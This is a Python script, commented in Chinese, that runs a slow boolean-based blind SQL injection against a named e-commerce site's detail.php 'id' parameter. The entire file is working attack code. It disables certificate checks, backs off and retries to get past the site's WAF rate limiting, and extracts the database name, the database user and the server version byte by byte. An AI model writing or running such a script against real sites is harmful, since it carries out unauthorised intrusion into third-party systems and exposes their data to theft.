#!/usr/bin/env python3
"""yijing_bg_dump.py - 后台慢速布尔盲注完整提取
通道: id=687' and if(条件,687,0)#  真=含"产品展示模块"
"""
import urllib.request, urllib.parse, ssl, re, time, sys, json, os

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='
TRUE_MARK = '产品展示模块'
LOG = '/tmp/yijing_dump_result.log'
STATE = '/tmp/yijing_dump_state.json'

def log(msg):
    with open(LOG, 'a') as f:
        f.write('[%s] %s\n' % (time.strftime('%H:%M:%S'), msg))
    print('[%s] %s' % (time.strftime('%H:%M:%S'), msg), flush=True)

def q(payload):
    """单次查询, 返回 True/False/None(WAF限频或报错)"""
    url = BASE + urllib.parse.quote(payload, safe='')
    for retry in range(6):
        try:
            r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=15, context=ctx)
            b = r.read(80000).decode('utf-8','ignore')
        except urllib.error.HTTPError as e:
            b = e.read(80000).decode('utf-8','ignore')
        except Exception:
            time.sleep(5); continue
        if 'WTS-WAF' in b:
            time.sleep(10); continue  # 限频, 长等待重试
        if 'Invalid SQL' in b or 'MySQL Error' in b:
            return None  # SQL报错
        return TRUE_MARK in b
    return None

def test(cond, sleep=1.5):
    """带降速的测试"""
    r = q("687' and if(%s,687,0)#" % cond)
    time.sleep(sleep)
    return r

def load_state():
    if os.path.exists(STATE):
        try:
            return json.load(open(STATE))
        except: pass
    return {}

def save_state(s):
    json.dump(s, open(STATE, 'w'))

def get_len(expr, name):
    """提取长度(等值遍历1-64)"""
    log('提取 %s 长度...' % name)
    for n in range(1, 65):
        r = test("length(%s)=%d" % (expr, n))
        if r is True:
            log('%s 长度 = %d' % (name, n))
            return n
    log('%s 长度提取失败' % name)
    return None

def get_char_ascii(expr, pos, name):
    """提取单字符ascii(等值遍历0-255, 中文优先224-239)"""
    # 中文首字节优先
    ranges = [list(range(224, 240)), list(range(0, 224)), list(range(240, 256))]
    for rng in ranges:
        for n in rng:
            r = test("ascii(substr(%s,%d,1))=%d" % (expr, pos, n))
            if r is True:
                return n
    return None

def dump_ascii(expr, name, maxlen=64):
    """用ascii逐字符提取, 返回ascii列表"""
    ln = get_len(expr, name)
    if not ln:
        return None
    if ln > maxlen:
        log('%s 长度%d超限' % (name, ln))
        return None
    result = []
    for i in range(1, ln+1):
        c = get_char_ascii(expr, i, name)
        if c is None:
            log('%s 第%d字符提取失败' % (name, i))
            result.append(-1)
        else:
            result.append(c)
        log('%s [%d/%d] ascii=%s' % (name, i, ln, c))
    return result

def ascii_to_str(arr):
    """ascii列表转字符串(尝试utf-8中文解码)"""
    if not arr:
        return '?'
    # 先尝试直接chr
    s = ''.join(chr(c) if 0 <= c < 256 else '?' for c in arr)
    # 尝试utf-8解码
    try:
        b = bytes(c for c in arr if 0 <= c < 256)
        return b.decode('utf-8')
    except:
        return s

if __name__ == '__main__':
    log('=== yijingweb.com 后台盲注启动 ===')

    # 1. 通道自检
    t = test('1=1')
    f = test('1=2')
    log('通道自检: 真=%s 假=%s' % (t, f))
    if t is not True or f is not False:
        log('通道不稳定, 退出')
        sys.exit(1)

    # 2. 测试 > 是否可用(决定二分法)
    gt_test = test('97>96')
    log('>测试(97>96): %s' % gt_test)
    if gt_test is True:
        log('>>> > 可用, 可用二分法加速!')
    else:
        log('>>> > 不可用, 用等值遍历')

    # 3. 提取 database()
    log('=== 提取 database() ===')
    db_arr = dump_ascii('database()', 'database', 32)
    if db_arr:
        db_str = ascii_to_str(db_arr)
        log('database() = %s (ascii=%s)' % (db_str, db_arr))

    # 4. 提取 user()
    log('=== 提取 user() ===')
    user_arr = dump_ascii('user()', 'user', 48)
    if user_arr:
        user_str = ascii_to_str(user_arr)
        log('user() = %s' % user_str)

    # 5. 提取 version()
    log('=== 提取 version() ===')
    ver_arr = dump_ascii('version()', 'version', 32)
    if ver_arr:
        ver_str = ascii_to_str(ver_arr)
        log('version() = %s' % ver_str)

    log('=== 提取完成 ===')
